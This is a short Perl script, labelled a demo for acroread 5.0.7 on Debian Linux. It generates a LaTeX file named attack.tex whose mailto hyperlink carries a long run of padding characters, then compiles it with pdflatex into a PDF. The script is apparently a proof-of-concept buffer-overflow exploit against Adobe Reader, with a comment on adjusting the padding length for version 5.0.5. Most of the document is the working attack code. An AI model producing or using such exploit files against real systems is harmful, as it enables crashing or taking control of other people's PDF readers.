#!/usr/bin/perl --
#
# Demo for acroread 5.0.7 on Debian Linux
#
print '
Writing TeX file ...
';
# For acroread 5.0.5 use 248 Bs instead of 504
open P, '>attack.tex';
print P '
\documentclass[11pt]{letter}
\usepackage{times}
\usepackage[pdfpagemode=none,pdfstartview=FitH]{hyperref}
\begin{document}
   \href{mailto:X',("B"x504).("A"x4),'}
   {\texttt{mailto:X("B"x504).("A"x4)}}
\end{document}
';
close P;
#
print '
Running pdflatex ...
';
system 'pdflatex attack';
#
#!#

